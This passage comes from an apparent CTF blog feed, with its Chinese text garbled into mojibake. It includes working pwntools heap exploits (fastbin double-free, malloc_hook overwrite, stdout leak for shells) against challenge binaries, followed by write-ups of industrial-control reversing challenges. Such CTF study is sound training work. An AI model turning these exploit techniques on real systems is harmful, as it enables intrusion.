class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x60</span>mes = <span class="hljs-string">'b'</span> * <span class="hljs-number">23</span>add(<span class="hljs-number">0x100</span>,payload,mes)add(<span class="hljs-number">0x60</span>,payload,mes)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>,mes)show()ru(<span class="hljs-string">"Game[2]'s name :"</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b20</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)malloc_hook = libc_base + <span class="hljs-number">0x3c4aed</span>add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))one = <span class="hljs-number">0x4527a</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0</span>) + p64(one)add(<span class="hljs-number">0x60</span>,payload,payload)itr()</code></pre></div><p>å…¶ä¸­å¯ä»¥ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿›è¡Œgetshellï¼Œä¹Ÿå¯ä»¥åŒæ—¶2æ¬¡freeåŒä¸€ä¸ªchunkï¼Œè§¦å‘æŠ¥é”™å‡½æ•°ï¼Œè€Œè°ƒç”¨æŠ¥é”™å‡½æ•°çš„æ—¶å€™åˆä¼šç”¨åˆ°<code>malloc_hook</code>ï¼Œä»è€Œgetshellã€‚</p><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><ul><li>åªæœ‰addå’ŒdelåŠŸèƒ½</li><li>å­˜åœ¨uaf</li><li>åªèƒ½ç”³è¯·&lt;0x70çš„å †å—</li></ul><h4 id="å‰ç½®æŠ€èƒ½"><a href="#å‰ç½®æŠ€èƒ½" class="headerlink" title="å‰ç½®æŠ€èƒ½"></a>å‰ç½®æŠ€èƒ½</h4><p>éœ€è¦åˆ©ç”¨scanfå‡½æ•°æ¥è§¦å‘<code>malloc_consolidate</code>ï¼Œä½¿<strong>ç›¸é‚»fastbinå †å—</strong>è¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾å…¥unsortedbinçš„ é˜Ÿåˆ—ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p><p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p><p><code>malloc_consolidate</code>å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>åˆ¤æ–­fastbinæ˜¯å¦åˆå§‹åŒ–ï¼Œå¦‚æœæœªåˆå§‹åŒ–ï¼Œåˆ™è¿›è¡Œåˆå§‹åŒ–ç„¶åé€€å‡ºã€‚</li><li>æŒ‰ç…§fastbinç”±å°åˆ°å¤§çš„é¡ºåºï¼ˆ0x20 ,0x30 ,0x40è¿™ä¸ªé¡ºåºï¼‰åˆå¹¶chunkï¼Œæ¯ç§ç›¸åŒå¤§å°çš„fastbinä¸­chunkçš„å¤„ç†é¡ºåºæ˜¯ä»fastbin-&gt;fdå¼€å§‹å–ï¼Œä¸‹ä¸€ä¸ªå¤„ç†çš„æ˜¯p-&gt;fdï¼Œä¾æ¬¡ç±»æ¨ã€‚</li><li>é¦–å…ˆå°è¯•åˆå¹¶<code>pre_chunk</code>ã€‚</li><li>ç„¶åå°è¯•åˆå¹¶<code>next_chunk</code>ï¼šå¦‚æœ<code>next_chunk</code>æ˜¯<code>top_chunk</code>ï¼Œåˆ™ç›´æ¥åˆå¹¶åˆ°<code>top_chunk</code>ï¼Œç„¶åè¿›è¡Œç¬¬å…­æ­¥ï¼›å¦‚æœ<code>next_chunk</code>ä¸æ˜¯<code>top_chunk</code>ï¼Œå°è¯•åˆå¹¶ã€‚</li><li>å°†å¤„ç†å®Œçš„chunkæ’å…¥åˆ°unsorted binå¤´éƒ¨ã€‚</li><li>è·å–ä¸‹ä¸€ä¸ªç©ºé—²çš„fastbinï¼Œå›åˆ°ç¬¬äºŒæ­¥ï¼Œç›´åˆ°æ¸…ç©ºæ‰€æœ‰fastbinä¸­çš„chunkï¼Œç„¶åé€€å‡ºã€‚</li></ol><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ul><li>åˆ©ç”¨scanfå‡½æ•°æ¥è§¦å‘<code>malloc_consolidate</code>ï¼Œä½¿<strong>ç›¸é‚»fastbinå †å—</strong>è¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾å…¥unsortedbinçš„ é˜Ÿåˆ—ï¼Œåœ¨å †ä¸Šç•™ä¸‹libcçš„ç›¸å…³åœ°å€</li><li>åˆ©ç”¨fastbin attack ï¼Œæ‰“<code>__IO_2_1_stdout</code>ï¼Œæ³„æ¼libc</li><li>åˆ©ç”¨fastbin attack ï¼Œæ‰“<code>malloc_hook</code></li></ul><p>éš¾ç‚¹åœ¨ç”³è¯·å †å—çš„æ•°é‡,é¢˜ç›®é™åˆ¶äº†19ä¸ªï¼Œæ˜¯åˆšåˆšå¤Ÿç”¨ã€‚</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">"game's name:"</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x28</span>    mes = <span class="hljs-string">'2'</span> * <span class="hljs-number">23</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#2</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#4</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#5</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#6</span>    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">5</span>)    <span class="hljs-comment"># debug()</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sl(<span class="hljs-string">'1'</span>*<span class="hljs-number">0x500</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#7</span>    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#8</span>    free(<span class="hljs-number">6</span>)    free(<span class="hljs-number">7</span>)    free(<span class="hljs-number">6</span>)    add(<span class="hljs-number">0x68</span>,p8(<span class="hljs-number">0x90</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#9</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#10</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#11</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#12</span>    payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'104'</span>) <span class="hljs-comment">#13</span>    sa(<span class="hljs-string">'name'</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)ru(<span class="hljs-string">'age'</span>)sl(<span class="hljs-string">'1'</span>)free(<span class="hljs-number">10</span>)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_addradd(<span class="hljs-number">0x68</span>,p64(malloc_hook),<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)one_rec = <span class="hljs-number">0xf0364</span> + libc_addrpayload = <span class="hljs-string">'1'</span> * (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>)+ p64(one_rec)add(<span class="hljs-number">0x68</span>,payload,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">6</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp</title>
    <link href="/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="å·¥æ§wp"><a href="#å·¥æ§wp" class="headerlink" title="å·¥æ§wp"></a>å·¥æ§wp</h1><h2 id="ICS-8"><a href="#ICS-8" class="headerlink" title="ICS_8"></a><code>ICS_8</code></h2><p>å°±æ˜¯ä¸€ä¸ªç®—æ³•çš„é€†å‘ã€‚</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> base64cypher_text = <span class="hljs-string">'HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw=='</span>iv = struct.unpack(<span class="hljs-string">"I"</span>, <span class="hljs-string">'x1a0'</span>)[<span class="hljs-number">0</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(cypher_text,iv)</span>:</span>    cypher_text = base64.b64decode(cypher_text)    padding = <span class="hljs-number">4</span> - len(cypher_text) % <span class="hljs-number">4</span>    <span class="hljs-keyword">if</span> padding != <span class="hljs-number">0</span>:        cypher_text = cypher_text + <span class="hljs-string">"\x00"</span> * padding    l = cypher_text    crypher = struct.unpack(<span class="hljs-string">"I"</span>*(len(l)/<span class="hljs-number">4</span>),l)    datas = []    datas += [ decrypto(crypher[<span class="hljs-number">0</span>]) ^ iv ]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len(crypher)):        datas += [decrypto(crypher[i]) ^ crypher[i<span class="hljs-number">-1</span>]]    <span class="hljs-keyword">return</span> datas<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypto</span><span class="hljs-params">(data)</span>:</span>    <span class="hljs-keyword">return</span> data ^ (data &gt;&gt; <span class="hljs-number">16</span>)datas = decode(cypher_text,iv)flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:    flag += struct.pack(<span class="hljs-string">"I"</span>,i)<span class="hljs-keyword">print</span> flag</code></pre></div><h2 id="ICS-9"><a href="#ICS-9" class="headerlink" title="ICS_9"></a><code>ICS_9</code></h2><p>è§£å‹ä»¥åæ˜¯ä¸€ä¸ªimgï¼Œä½†æ˜¯å‘ç°æ˜¯æŸåçš„ã€‚</p><div class="hljs"><pre><code class="hljs bash">file ./ICS_9.img./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)</code></pre></div><p>å¯ä»¥çœ‹åˆ°æ˜¯ext4çš„æ–‡ä»¶ã€‚<br>ç„¶åå¯ä»¥ç”¨fsckä¿®å¤ä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs bash"> fsck.ext4 ./ICS_9.imge2fsck 1.42.13 (17-May-2015)ext2fs_open2: The ext2 superblock is corruptfsck.ext4: Superblock invalid, trying backup blocks..../ICS_9.img was not cleanly unmounted, check forced.Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (6789, counted=488).</span>Fix&lt;y&gt;? yesFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#1 (2006, counted=228).</span>Fix&lt;y&gt;? yesFree blocks count wrong (8795, counted=716).Fix&lt;y&gt;? yesFree inodes count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (1269, counted=1262).</span>Fix&lt;y&gt;? yesFree inodes count wrong (2549, counted=2542).Fix&lt;y&gt;? yes./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED *****./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/kfnyiY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åè¿›è¡ŒæŒ‚è½½:</p><div class="hljs"><pre><code class="hljs bash">mkdir tmp2sudo mount ICS_9.img tmp2 ; ls -larth tmp2</code></pre></div><div class="hljs"><pre><code class="hljs bash"> binwalk fil.encScan Time:     2015-03-09 15:35:08Target File:   /tmp/wu/tmp/fil.encMD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4Signatures:    328DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12Ecat AE54[71A3j9[\22?/+u0</code></pre></div><p>Binwalk ä¸€ä¸‹ï¼Œå‘ç°encæ–‡ä»¶æ˜¯opensslåŠ å¯†çš„æ–‡ä»¶ï¼ŒAE5æ–‡ä»¶æ˜¯å…³äºåŠ å¯†ç®—æ³•å’Œå¯†é’¥ã€‚</p><p>ä½†æ˜¯å¹¶ä¸çŸ¥é“æ˜¯å“ªç§æ¨¡å¼çš„åŠ å¯†å’Œå¯†é’¥çš„é•¿åº¦çš„åŠ å¯†ï¼Œéœ€è¦å†™ä¸€ä¸ªè„šæœ¬æµ‹è¯•ã€‚<br>è¿™æ˜¯æ‰€æœ‰çš„å¯èƒ½ï¼š</p><div class="hljs"><pre><code class="hljs bash">-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192</code></pre></div><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash  </span> KEY=`cat AE5`   AES=<span class="hljs-string">"-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192"</span>   <span class="hljs-keyword">for</span> mode <span class="hljs-keyword">in</span> <span class="hljs-variable">$AES</span>   <span class="hljs-keyword">do</span>        openssl enc -d -<span class="hljs-keyword">in</span> fil.enc -out ./tmp3/fil<span class="hljs-string">"<span class="hljs-variable">$mode</span>"</span>.dec -k <span class="hljs-variable">$KEY</span> <span class="hljs-variable">$mode</span>   <span class="hljs-keyword">done</span></code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo chmod +x ./1.shsudo sh 1.sh</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/X2q45Z.png" srcset="/img/loading.gif" alt></p><h2 id="ICS-11"><a href="#ICS-11" class="headerlink" title="ICS_11"></a><code>ICS_11</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/UypJgM.png" srcset="/img/loading.gif" alt><br>ç¨‹åºä¸Šæ¥å°±å‘Šè¯‰ä¸€ä¸‹flagçš„æ ¼å¼ï¼Œå…¶ä¸­å­—ç¬¦çš„å†…å®¹æ˜¯20ä½ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/SzWq5u.png" srcset="/img/loading.gif" alt><br>å‘ä¸‹èµ°ï¼Œä¹Ÿä¼šå‘ç°æœ‰20çš„ç›¸å…³åˆ¤æ–­ã€‚<br>å…¶ä¸Šæ–¹æœ‰ä¸ªå¤§å°åˆ¤æ–­å¤§äº10å°±é€€å‡ºäº†ï¼Œä½†æ˜¯flagæ˜¯20ä½çš„ï¼Œæ˜æ˜¾éœ€è¦patchä¸€ä¸‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/6BsYEl.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå¾€ä¸‹åˆ†æï¼Œå‘ç°ä½ è¾“å…¥çš„ä¸œè¥¿ä¼šè·Ÿ12ä½çš„<code>nemo_pwned_n</code>è¿›è¡Œå…ˆæ¯”è¾ƒä¸€ä¸‹ï¼Œ<br>æ¥ç€:</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 )</code></pre></div><p>æ˜æ˜¾è¿™æ˜¯éƒ½éœ€è¦è¿›è¡Œæ»¡è¶³çš„ã€‚<br>ç„¶åæ±‚è§£ä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs bash">In [6]: hex(926180401)Out[6]: <span class="hljs-string">'0x37346431'</span> (v17)In [7]: hex(1915971957)Out[7]: <span class="hljs-string">'0x72336975'</span>. (v18)</code></pre></div><p>è¿™æ ·å¤§æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œå…¶å®ä¹Ÿæ˜¯åˆ¤æ–­å­—ç¬¦çš„ï¼Œè½¬ç ä¸€ä¸‹ï¼š</p><p><code>0x37346431:74d1  0x72336975 :r3iu</code><br>ä½†æ˜¯å› ä¸ºåœ¨å†…å­˜ä¸­ï¼Œå…¶æ˜¯å°ç«¯åºçš„ï¼Œéœ€è¦åè½¬ä¸€ä¸‹ã€‚<br>çŒœæµ‹flagå°±æ˜¯<code>nemo_pwned_n1d47ui3r</code>ã€‚å…¶é•¿åº¦æ­£å¥½å°±æ˜¯20ä½ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/mDsH7W.png" srcset="/img/loading.gif" alt><br>ç»è¿‡éªŒè¯çš„ç¡®æ˜¯çš„ã€‚</p><h2 id="ICS-13"><a href="#ICS-13" class="headerlink" title="ICS_13"></a><code>ICS_13</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/gvE3nU.png" srcset="/img/loading.gif" alt><br>ååˆ†ç®€å•ï¼Œè‡ªå·±è¾“å…¥çš„ä¸œè¥¿å‡å»0x14ï¼Œå’Œ<code>10445678951</code>è¿›è¡Œä¸€ä¸ªä¸ªå­—èŠ‚çš„æ¯”è¾ƒï¼Œç›¸ç­‰å°±okã€‚</p><div class="hljs"><pre><code class="hljs bash">key = <span class="hljs-string">'10445678951'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key :    flag += chr(i+0x14)<span class="hljs-built_in">print</span>(flag)</code></pre></div><h2 id="ICS-2"><a href="#ICS-2" class="headerlink" title="ICS_2"></a><code>ICS_2</code></h2><p>å…ˆè„±å£³ï¼Œespå®šå¾‹è„±å£³ã€‚ä¹Ÿå¯ä»¥ç”¨ä¸‡èƒ½è„±å£³æœºè¿›è¡Œè„±ã€‚<br>ç”±äºç»™äº†æç¤ºï¼Œæ˜¯éœ€è¦æ‰¾ä¸€ä¸ªipã€‚å¾ˆç®€å•çš„æ€è·¯å°±æ˜¯ç›´æ¥æ‰¾å¯ç–‘ipã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OjHdLY.png" srcset="/img/loading.gif" alt></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y2gpgp.png" srcset="/img/loading.gif" alt></p><p>x32dbgç›´æ¥æ–­åœ¨è¿™é‡Œï¼Œå‘ä¸‹è·Ÿã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2Nsxbj.png" srcset="/img/loading.gif" alt><br>å‘ç°å¯ç–‘ipï¼Œæäº¤å°±å¯¹äº†ã€‚</p><h2 id="ICS-14"><a href="#ICS-14" class="headerlink" title="ICS_14"></a><code>ICS_14</code></h2><p>ç¨‹åºå°±æ˜¯å¾ˆç®€å•æ‰¾åˆ°æ³¨å†Œç ã€‚<br>é‚®ç®±å¯ä»¥ä¹±è¾“å…¥ï¼Œä½†æ˜¯è¦ä¿è¯<code>@</code> + <code>xx</code> + <code>.</code> + <code>xx</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f3gbCC.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œæœ‰å‡½æ•°è¿›è¡Œæ§åˆ¶åˆ¤æ–­ã€‚<br>å¦‚æœä¸å¯¹å°±ä¼šè¯´ï¼Œé‚®ç®±ä¸åˆæ³•ã€‚<br>æ¥ç€çœ‹æµç¨‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/UDpOQ0.png" srcset="/img/loading.gif" alt></p><p>è¿™å—åœ¨åˆ¤æ–­ä¸€å †ä¸œè¥¿ï¼Œæ¨æµ‹å°±æ˜¯æ³¨å†Œç ã€‚<br>å¾€ä¸Šä¸€çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€æ¡ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zigrXA.png" srcset="/img/loading.gif" alt><br>æ˜æ˜¾æ˜¯idaæ— 